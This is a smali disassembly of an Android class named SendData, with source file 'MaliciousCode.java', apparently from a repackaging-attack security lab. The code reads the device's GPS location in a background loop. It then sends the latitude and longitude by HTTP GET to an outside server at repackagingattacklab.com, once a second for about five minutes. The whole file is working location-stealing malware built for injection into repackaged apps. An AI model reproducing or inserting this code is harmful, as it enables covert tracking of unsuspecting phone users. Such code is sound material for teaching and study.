.class Lcom/mobiseed/repackaging/SendData;
.super Landroid/os/AsyncTask;
.source "MaliciousCode.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# instance fields
.field ctx:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "a"    # Landroid/content/Context;

    .prologue
    .line 38
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 39
    iput-object p1, p0, Lcom/mobiseed/repackaging/SendData;->ctx:Landroid/content/Context;

    .line 40
    return-void
.end method


# virtual methods
.method public Get(Ljava/lang/String;)V
    .locals 6
    .param p1, "a"    # Ljava/lang/String;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 45
    new-instance v3, Ljava/net/URL;

    invoke-direct {v3, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 46
    .local v3, "urlConnection":Ljava/net/URL;
    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    .line 47
    .local v0, "con":Ljava/net/HttpURLConnection;
    const-string v4, "GET"

    invoke-virtual {v0, v4}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 48
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v4, Ljava/io/InputStreamReader;

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v1, v4}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 50
    .local v1, "in":Ljava/io/BufferedReader;
    :cond_0
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    .local v2, "input":Ljava/lang/String;
    if-nez v2, :cond_0

    .line 52
    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V

    .line 53
    return-void
.end method

.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    .prologue
    .line 34
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/mobiseed/repackaging/SendData;->doInBackground([Ljava/lang/String;)Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/Void;
    .locals 10
    .param p1, "urls"    # [Ljava/lang/String;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    .prologue
    .line 57
    iget-object v6, p0, Lcom/mobiseed/repackaging/SendData;->ctx:Landroid/content/Context;

    const-string v7, "location"

    invoke-virtual {v6, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/location/LocationManager;

    .line 58
    .local v3, "locMgr":Landroid/location/LocationManager;
    new-instance v2, Lcom/mobiseed/repackaging/SendData$1;

    invoke-direct {v2, p0}, Lcom/mobiseed/repackaging/SendData$1;-><init>(Lcom/mobiseed/repackaging/SendData;)V

    .line 82
    .local v2, "lis":Landroid/location/LocationListener;
    const/4 v0, 0x0

    .line 83
    .local v0, "count":I
    :goto_0
    const/16 v6, 0x131

    if-ge v0, v6, :cond_2

    .line 85
    iget-object v6, p0, Lcom/mobiseed/repackaging/SendData;->ctx:Landroid/content/Context;

    const-string v7, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {v6, v7}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v6

    if-eqz v6, :cond_0

    iget-object v6, p0, Lcom/mobiseed/repackaging/SendData;->ctx:Landroid/content/Context;

    const-string v7, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-static {v6, v7}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v6

    if-eqz v6, :cond_0

    .line 94
    :cond_0
    const-string v6, "gps"

    invoke-virtual {v3, v6}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v4

    .line 95
    .local v4, "location":Landroid/location/Location;
    :goto_1
    if-nez v4, :cond_1

    .line 97
    const-wide/16 v6, 0x3e8

    :try_start_0
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V

    .line 98
    const-string v6, "gps"

    invoke-virtual {v3, v6}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v4

    goto :goto_1

    .line 99
    :catch_0
    move-exception v1

    .line 100
    .local v1, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v1}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_1

    .line 103
    .end local v1    # "e":Ljava/lang/InterruptedException;
    :cond_1
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "lat="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v4}, Landroid/location/Location;->getLatitude()D

    move-result-wide v8

    invoke-virtual {v6, v8, v9}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "&"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "lng="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v4}, Landroid/location/Location;->getLongitude()D

    move-result-wide v8

    invoke-virtual {v6, v8, v9}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 104
    .local v5, "s":Ljava/lang/String;
    const-string v6, "string"

    invoke-static {v6, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 106
    :try_start_1
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "http://www.repackagingattacklab.com/location.php?"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {p0, v6}, Lcom/mobiseed/repackaging/SendData;->Get(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 112
    :goto_2
    const-wide/16 v6, 0x3e8

    :try_start_2
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_2

    .line 113
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 107
    :catch_1
    move-exception v1

    .line 108
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2

    .line 114
    .end local v1    # "e":Ljava/lang/Exception;
    :catch_2
    move-exception v1

    .line 115
    .local v1, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v1}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_0

    .line 119
    .end local v1    # "e":Ljava/lang/InterruptedException;
    .end local v4    # "location":Landroid/location/Location;
    .end local v5    # "s":Ljava/lang/String;
    :cond_2
    const/4 v6, 0x0

    return-object v6
.end method
